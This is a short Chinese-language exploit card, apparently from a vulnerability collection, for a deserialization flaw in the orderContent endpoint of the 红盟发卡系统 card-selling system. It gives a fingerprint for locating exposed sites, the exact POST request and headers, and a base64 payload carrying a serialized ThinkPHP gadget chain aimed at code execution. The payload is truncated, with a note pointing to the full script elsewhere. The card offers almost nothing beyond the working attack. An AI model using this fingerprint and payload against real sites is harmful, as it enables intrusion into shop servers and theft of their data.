# 红盟发卡系统orderContent存在反序列化

- **系统**：红盟发卡系统　|　**类型**：反序列化　|　**CVE**：—
- **指纹**：`body="/assets/shop/dist/uaredirect.js?v=1.2.0"`
- **请求**：`POST /index.php/shop/order/orderContent?order_no=1 HTTP/2`
- **关键头**：`Content-Type: application/x-www-form-urlencoded; charset=UTF-8`　`X-Requested-With: XMLHttpRequest`　`Content-Length: 490`

**请求体 / payload**
```
search_content=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mzp7czo5OiIAKgBhcHBlbmQiO2E6MTp7aTowO3M6ODoiZ2V0RXJyb3IiO31zOjg6IgAqAGVycm9yIjtPOjI3OiJ0aGlua1xtb2RlbFxyZWxhdGlvblxIYXNPbmUiOjM6e3M6MTE6IgAqAGJpbmRBdHRyIjthOjI6e2k6MDtzOjY6ImthbmppbiI7aToxO3M6Njoia2FuamluIjt9czoxNToiACoAc2VsZlJlbGF0aW9uIjtiOjA7czo4OiIAKgBxdWVyeSI7TzoxNDoidGhpbmtcZGJcUXVlcnkiOjE6e3M6ODoiACoAbW9kZWwiO086MjA6InRoaW5rXGNvbnNvbGVcT3V0cHV0IjoyOntzOjI4OiIAdGhpbmtcY29uc29sZVxPdXRwdXQAaGFuZGxlIjtPOjI5OiJ0aGlua1xzZXNzaW9uX…（脚本共 1802 字，完整版见原文）
```
- **预期**：200　|　—